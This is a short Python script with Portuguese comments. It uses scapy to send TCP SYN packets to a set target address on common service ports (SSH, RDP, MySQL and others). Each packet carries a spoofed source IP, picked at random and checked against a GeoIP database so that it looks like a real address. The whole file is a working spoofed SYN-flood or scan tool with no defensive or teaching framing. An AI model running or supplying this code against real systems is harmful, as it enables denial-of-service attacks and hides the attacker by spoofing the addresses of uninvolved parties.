import geoip2.database
import random
from scapy.all import IP, TCP, send

# Defina a interface de rede que será utilizada
interface = "wlp63s0"  # Substitua pelo nome correto da interface (ex: eth0, wlan0)

# Defina o IP de destino
target_ip = "203.0.113.10"  # Endereço de IP do servidor que deseja "conectar"

# Caminho para o banco de dados GeoIP
geoip_db_path = "/usr/share/GeoIP/GeoLite2-City.mmdb"

# Lista de portas comuns associadas a serviços conhecidos
common_ports = {
    "HTTP": 80,
    "HTTPS": 443,
    "SSH": 22,
    "FTP": 21,
    "SMTP": 25,
    "DNS": 53,
    "MySQL": 3306,
    "PostgreSQL": 5432,
    "RDP": 3389,
    "Telnet": 23
}

# Carregar a base de dados GeoIP
reader = geoip2.database.Reader(geoip_db_path)

# Função para gerar IP aleatório
def generate_random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

# Lista de IPs válidos para simulação
valid_ips = []

# Gerar uma lista de IPs válidos a partir do banco de dados
for _ in range(100):  # Ajuste o número de IPs que deseja gerar
    random_ip = generate_random_ip()
    try:
        response = reader.city(random_ip)
        if response:  # Verifica se o IP existe no banco de dados
            valid_ips.append(random_ip)
    except geoip2.errors.AddressNotFoundError:
        continue

# Fechar o leitor de banco de dados
reader.close()

# Enviar pacotes SYN com IPs de origem aleatórios e válidos
for fake_ip in valid_ips:
    # Seleciona uma porta de serviço conhecida aleatoriamente para a origem
    source_port = random.randint(1024, 65535)  # Porta de origem aleatória

    # Seleciona uma porta de destino aleatoriamente da lista de portas conhecidas
    target_port = random.choice(list(common_ports.values()))

    # Criar o pacote IP
    ip = IP(src=fake_ip, dst=target_ip)

    # Criar o pacote TCP SYN com a porta de destino definida
    tcp = TCP(sport=source_port, dport=target_port, flags="S")

    # Combine os pacotes
    packet = ip/tcp

    # Envie o pacote
    send(packet, iface=interface, verbose=0)
    print(f"Pacote SYN enviado de {fake_ip}:{source_port} para {target_ip}:{target_port}")
